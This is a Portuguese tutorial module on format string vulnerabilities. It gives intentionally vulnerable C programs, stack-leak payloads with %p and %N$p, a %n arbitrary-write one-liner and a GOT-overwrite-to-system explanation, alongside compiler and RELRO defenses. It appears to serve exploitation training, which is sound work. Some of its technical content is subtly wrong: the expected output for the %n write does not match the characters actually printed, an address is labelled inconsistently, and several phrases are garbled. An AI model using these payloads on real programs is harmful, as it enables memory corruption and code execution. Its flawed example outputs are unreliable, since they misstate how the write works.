4.07

Format string bugs: leak, escrita e a regra da format string explícita

Quando printf(buf) vira leitura e escrita de memória

Nível: Avançado/Cyber Duração: ~40 min Pré-requisitos: T4.03 (memória), T2.05 (strings/printf), T4.04 (gdb)

🎯 Objetivos

Entender o bug de format string (CWE-134): como printf variadic consome argumentos a mais (leak com %x/%p/%s e escrita com %n), ler a pilha com posicionamento (%N$), escrever em endereço arbitrário em 32 bits (GOT overwrite teórico) e aplicar a defesa definitiva: format string explícita, sempre.

📖 Leitura guiada

Foco da leitura: Consulte o CTF-Wiki, seção "Format String" (https://ctf-wiki.org), para a técnica de escrita posicional e GOT overwrite, e o artigo clássico de Tim Newsham, "Format String Attacks" (1998, disponível em vários mirrors acadêmicos) — referências históricas que explicam a mecânica %n palavra por palavra.

O bug é a entrada virar format string

printf(entrada_usuario) em vez de printf("%s", entrada_usuario) faz o conteúdo digitado ser interpretado como format. Como printf é variadic (não sabe quantos argumentos existem), ele apenas consome o que estiver nos registradores/na pilha — inclusive dados que o programador nunca quis passar. O atacante não escreve nada na memória: ele lê e escreve usando a própria printf como ponteiro controlado.

Leak: %p e %x leem valores do stack/registradores

O exemplo clássico: cada %x/%p imprime o próximo "argumento". Envie uma pilha de %p. e veja ponteiros da pilha e da libc vazando — é o tipo de leak que o módulo 06 transforma em exploit (calcula a base da libc).

Código — fmt_leak.c (VULNERÁVEL)
/* fmt_leak.c -- printf(buf) com entrada do usuario (VULNERAVEL, CWE-134).
   gcc -Wall -Wextra -std=c11 fmt_leak.c -o fmt_leak   (qualquer SO) */
#include <stdio.h>

int main(void)
{
    char buf[200];
    printf("digite: ");
    if (fgets(buf, sizeof buf, stdin) == NULL) return 1;
    printf(buf);                  /* VULNERAVEL: buf vira format */
    printf("\n");
    return 0;
}
Saída esperada
$ ./fmt_leak
digite: AAAA%p.%p.%p.%p.%p.%p.
AAAA0x7fff1234abcd.0x7f00...08.0x1.0x7fff5678cdef.0x70252e70252e7025.0x41414141

Posicionamento: %N$p lê o N-ésimo argumento

Para ler um valor que sabemos estar em determinada posição (ex.: nossos próprios "AAAA" lá no fundo), usamos posicionamento direto: %5$p imprime o 5º argumento. Estratégia de descoberta no lab: envie AAAA.00A-%1$p.%2$p...%25$p. e procure onde aparece 0x41414141; aquele índice é o seu "bing shel" — será usado para leituras e escritas. Atente que em 64-bit os 5 primeiros argumentos são registradores (RSI, RDX, RCX, R8, R9) e a partir do 6º são slots da pilha. Já em 32-bit tudo vem da pilha.

Código — localizando o offset
$ ./fmt_leak
digite: AAAA.00A-%1$p.%2$p.%3$p.%4$p.%5$p.%6$p.%7$p.%8$p.%9$p.%10$p.
AAAA.00A-0x7ffff7a1...0x70252e25732425... 0x41414141
      ^^^^ procura por 0x41414141 -> neste lab caiu no %10$p

%s e o crash de leitura

%s trata o argumento como ponteiro para string e lê o que aponta — ao acertar um ponteiro válido da libc (vazado com %p), o atacante dereferencia endereço arbitrário e puxa bytes de lá (técnica de dump de memória). Quando o endereço é inválido, o processo morre com SIGSEGV — essencial também para crash forense: o offset do crash revela o endereço usado.

%n: a escrita — valor gravado é a "conta" de caracteres

%n grava quantos caracteres já foram impressos no endereço dado pelo argumento — abrindo uma write primitive. Combine com vazamentos de precisão (%Nu imprime N espaços para inflar a conta) e posicionamento: para escrever o valor 0x41414141 num alvo no índice 6, envie [4 bytes do endereço do alvo][%8u][%6$n]... — o clássico didático é o AAAA%6$n, onde os quatro A representam o endereço (substituídos por um endereço real).

Código — fmt_write 32-bit
/* fmt_write.c -- alvo de escrita (VULNERAVEL, CWE-134).
   Compile 32-bit para seguir o exemplo:  (Linux/WSL)
   sudo apt install gcc-multilib
   gcc -m32 -fno-stack-protector -Wall -Wextra -std=c11 fmt_write.c -o fmt_write */
#include <stdio.h>

int main(void)
{
    int alvo = 0x1111;
    char buf[200];
    printf("digite: ");
    if (fgets(buf, sizeof buf, stdin) == NULL) return 1;
    printf(buf);                  /* VULNERAVEL */
    printf("\nalvo = 0x%x\n", alvo);
    return 0;
}
Saída esperada
$ python3 -c 'import struct,sys; p=struct.pack("<I", 0xbffff5e0); sys.stdout.buffer.write(p + b"%6$n")' | ./fmt_write
digite:
alvo = 0x11ef
# o %6$n gravou no endereco 0xbffff5e0 (os 4 bytes do inicio do
# buffer) a quantidade de caracteres ja impressos (0x11ef = 4591);
# antes, alvo era 0x1111. A escrita aconteceu.

e onde dorme o poder de verdade: GOT overwrite (teoria, 32-bit)

Em binários com RELRO parcial (padrão antigo/CMake sem -z now), a GOT é gravável e guarda o endereço resolvido de funções como puts. Se o atacante sobrescreve puts@GOT para system, a próxima chamada a puts(arg passa a ser system(arg) — e se arg vier do usuário (ex.: a própria string do buffer), vira system("…"). É o mesmo %n de antes, agora mirando a GOT — ou a PLT/GOT entry. Defesa viva: -Wl,-z,relro,-z,now (full RELRO) torna a GOT read-only após o carregamento e mata esse vetor; e lembre que lemos escrevendo com %n em alvos exatos depende de leak+buffer posicionado (módulo 04/06).

Mitigação: a regra da format string explícita

A correção é estrutural, não cosmética:

  • Nunca passe dados para printf/scanf/fprintf/snprintf como format. O primeiro parâmetro é sempre uma string de formato (literal ou constante): printf("%s", buf).
  • Regra de busca no code review: procurar printf(variavel);, fprintf(fp, dado);, snprintf(b, n, variavel).
  • Deixe o compilador vigiar: -Wformat -Wformat-security -Wformat-nonliteral -Werror=format-security transforma o padrão em erro de build.
  • Se a string precisa ser "gerada" (log com partes enviadas), monte o FORMAT fixo e passe os dados como args: printf("user=%s", usuario) — nunca printf(usuario).
Código — regra da format
# build que TRANSFORMA o bug em erro:
gcc -Wall -Wextra -Wformat -Wformat-security -Wformat-nonliteral \
    -Werror=format-security fmt_leak.c -o fmt_leak_fortificado

# e a correcao em codigo:
printf(buf);        ->      printf("%s", buf);
Saída esperada
fmt_leak.c: In function 'main':
fmt_leak.c:12:13: error: format not a string literal and no format arguments
   12 |     printf(buf);

Como se defender

  • Regra inegociável: format string explícita em 100% das chamadas (a busca de texto no repositório acha o resto).
  • Fail fast no build com -Werror=format-security — o CI deve recusar o padrão, não avisar.
  • Mantenha full RELRO (-z relro -z now): sem GOT gravável, sobra pouco onde escrever com %n.
  • Não vaze endereços: mensagens de erro/log que imprimem ponteiros ou %p são leak deliberado.
  • Em logs com conteúdo do usuário ex.: snprintf(linha, n, "%s", entrada) e depois fprintf(fp, "%s", linha) — os dois lados explícitos — evita que o dado chegue "nu" a uma função variadic.
  • O bug também aparece em sprintf/strftime/…: a regra vale para qualquer função com format.

✏️ Exercícios

Nível 2

Exercício 4.07.1

Rode fmt_leak (qualquer SO) com a entrada AAAA.%x.%x.%x.%x.%x.%x. e depois com AAAA.%7$p.%8$p.%9$p.. Faça um teste de posicionamento até achar onde entram os 0x41414141 (seus AAAA). Anote o índice encontrado na sua sessão.

Dica: Aumente o range: AAAA-%1$p...-%30$p e busque por 0x41414141 — resp = index.

Ver solução
$ ./fmt_leak
digite: AAAA-%1$p-%2$p-%3$p-%10$p-%20$p-%30$p.
...
$ ./fmt_leak
digite: AAAA-%7$p-%8$p-%9$p.
...
# exemplo: neste binario 64-bit os AAAA caem no %17$p.
# O indice e LOCAL: voce determinou, nao precisa ser o do texto.
Nível 3

Exercício 4.07.2

Depois de achar o índice, vire o vetor de leitura em vetor de escrita: compile fmt_write 32-bit (-m32, multilib) com ASLR desligado por sessão e use o endereço real de alvo (descubra no gdb com p &alvo — ou, mais simples, coloque alvo como global e leia com objdump -t) para que %6$n mude o valor de alvo. Registre antes/depois.

Dica: Se o %N$n não cair no seu endereço, redescubra o índice do buf nesse binário 32-bit (o procedimento do exercício 1).

Ver solução
$ gcc -m32 -fno-stack-protector -Wall -Wextra -std=c11 fmt_write.c -o fmt_write
$ gdb ./fmt_write -ex "break main" -ex "run" -ex "p &alvo" -ex "quit"
$1 = (int *) 0xbffff5e0
$ python3 -c 'import struct,sys; sys.stdout.buffer.write(struct.pack("<I",0xbffff5e0)+b"%6$n")' | ./fmt_write
digite:
alvo = 0x11ef   # antes era 0x1111; agora vale n.

O valor novo (0x11ef = 4591) vem da contagem de caracteres já impressa até o %n; para valores grandes use %Nu para inflar a contagem.

Nível 3

Exercício 4.07.3

Recompile o fmt_leak com -Wformat-security -Werror=format-security e confira que a build falha apontando a linha do printf(buf). Depois corrija para printf("%s", buf) e recompile sem warnings.

Dica: O compilador sabe que um "format não literal" é o uso perigoso; a correção é o literal "%s".

Ver solução
$ gcc -Wall -Wextra -Wformat-security -Werror=format-security fmt_leak.c -o x
fmt_leak.c:12:13: error: format not a string literal and no format arguments
$ sed -i 's/printf(buf)/printf("%s", buf)/' fmt_leak.c
$ gcc -Wall -Wextra -Wformat-security -Werror=format-security fmt_leak.c -o x
# compila limpo
$ ./x
digite: AAAA%p.%p.
AAAA%p.%p.     # agora imprime literal, sem leak

❓ Verificação rápida

🏗️ Miniprojeto: Relatório: do leak ao %n (32-bit)

Em ~/labs/4.07, produza um relatório format.md (no WSL) contendo: (1) o fmt_leak 64-bit com a varredura de posicionamento e o índice onde os AAAA aparecem; (2) o fmt_write 32-bit com antes/depois de alvo e o endereço usado; (3) um parágrafo explicando como esse leak alimenta o ret2libc do módulo 06 (base = valor_vazado − offset_na_libc); (4) a prova de que -Werror=format-security falha o build com o padrão perigoso; (5) a correção final do código com diff (before/after).

Critérios de aceite

  • Índice do posicionamento determinado e documentado (seu, não o do texto).
  • Escrita de alvo com %N$n demonstrada com endereço real.
  • Cálculo base da libc a partir de um valor vazado coerente.
  • Build com -Werror=format-security falhando e a correção aplicada.
